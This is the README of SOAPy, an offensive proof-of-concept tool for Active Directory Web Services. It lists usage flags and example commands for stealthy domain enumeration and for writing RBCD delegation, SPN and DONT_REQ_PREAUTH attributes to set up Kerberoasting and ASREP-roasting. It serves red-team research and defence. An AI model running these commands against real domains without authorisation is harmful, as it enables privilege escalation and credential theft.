# Description
SOAPy is a Proof of Concept (PoC) tool for conducting offensive  interaction with Active Directory Web Services (ADWS) from Linux hosts. SOAPy includes previously undeveloped custom python implementations of a collection of Microsoft protocols required for interaction with the ADWS service. This includes but is not limited to: NNS (.NET NegotiateStream Protocol), NMF (.NET Message Framing Protocol), and NBFSE (.NET Binary Format: SOAP Extension).

SOAPy can be primarily utilized to interact with ADWS for stealthy recon over a proxy into an internal Active Directory environment. Additionally SoaPy can perform targeted DACL-focused post-exploitation over ADWS, including `servicePrincipalName` writing for targeted Kerberoasting, `DON’T_REQ_PREAUTH` writing for targeted ASREP-Roasting, and the ability to write to `msDs-AllowedToActOnBehalfOfOtherIdentity` for Resource-Based Constrained Delegation attacks. 

The protocol structure for interacting with ADWS is shown below:
![image](https://github.com/user-attachments/assets/e83a3e60-7aaf-4084-bcab-41e400d4055e)

The blog detailing the original research largely from an engineering perspective can be found [here](https://www.ibm.com/think/x-force/stealthy-enumeration-of-active-directory-environments-through-adws)

# Usage
```
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝ 
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝  
███████║╚██████╔╝██║  ██║██║        ██║   
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ╚═╝   

@_logangoins
github.com/jlevere  
          
usage: soapy [-h] [--debug] [--ts] [-H nthash] [--users] [--computers] [--groups] [--constrained]
             [--unconstrained] [--spns] [--asreproastable] [--admins] [--rbcds] [-q query] [-f attr,attr,...]
             [-dn distinguishedname] [-p] [--rbcd source] [--spn value] [--asrep] [--account account] [--remove]
             connection

Perform AD reconnaisance and post-exploitation through ADWS from Linux

positional arguments:
  connection            domain/username[:password]@<targetName or address>

options:
  -h, --help            show this help message and exit
  --debug               Turn DEBUG output ON
  --ts                  Adds timestamp to every logging output.
  -H, --hash nthash     Use an NT hash for authentication

Enumeration:
  --users               Enumerate user objects
  --computers           Enumerate computer objects
  --groups              Enumerate group objects
  --constrained         Enumerate objects with the msDS-AllowedToDelegateTo attribute set
  --unconstrained       Enumerate objects with the TRUSTED_FOR_DELEGATION flag set
  --spns                Enumerate accounts with the servicePrincipalName attribute set
  --asreproastable      Enumerate accounts with the DONT_REQ_PREAUTH flag set
  --admins              Enumerate high privilege accounts
  --rbcds               Enumerate accounts with msDs-AllowedToActOnBehalfOfOtherIdentity set
  -q, --query query     Raw query to execute on the target
  -f, --filter attr,attr,...
                        Attributes to select from the objects returned, in a comma seperated list
  -dn, --distinguishedname distinguishedname
                        The root objects distinguishedName for the query
  -p, --parse           Parse attributes to human readable format

Writing:
  --rbcd source         Operation to write or remove RBCD. Also used to pass in the source computer account used
                        for the attack.
  --altsecid value      Operation to write the altSecurityIdentities attribute value, writes by default unless "
                        --remove" is specified
  --spn value           Operation to write the servicePrincipalName attribute value, writes by default unless "
                        --remove" is specified
  --asrep               Operation to write the DONT_REQ_PREAUTH (0x400000) userAccountControl flag on a target
                        object
  --account account     Account to preform an operation on
  --remove              Operarion to remove an attribute value based off an operation
```

# Installation
With `pipx`:
```
pipx install .
```


With `poetry`:
```
poetry install
```

# Example Usage

Enumerate users using preset enumeration flags:
```
soapy <domain>/<user>:'<password>'@<ip> --users
```

Enumerate computers `samAccountName` and `objectSid` using a custom query/attribute filtering:
```
soapy <domain>/<user>:'<password>'@<ip> --query '(objectClass=computer)' --filter "samaccountname,objectsid"
```

Write `msDs-AllowedToActOnBehalfOfOtherIdentity` on DC01, enabling delegation from MS01 for an RBCD attack:
```
soapy <domain>/<user>:'<password>'@<ip> --rbcd 'MS01$' --account 'DC01$'
```

Write the `servicePrincipalName` attribute on jdoe as part of a targeted Kerberoasting attack:
```
soapy <domain>/<user>:'<password>'@<ip> --spn test/spn --account jdoe
```

Write `DONT_REQ_PREAUTH` (0x400000) on jdoe's `userAccountControl` attribute, making the account ASREP-Roastable:
```
soapy <domain>/<user>:'<password>'@<ip> --asrep --account jdoe
```
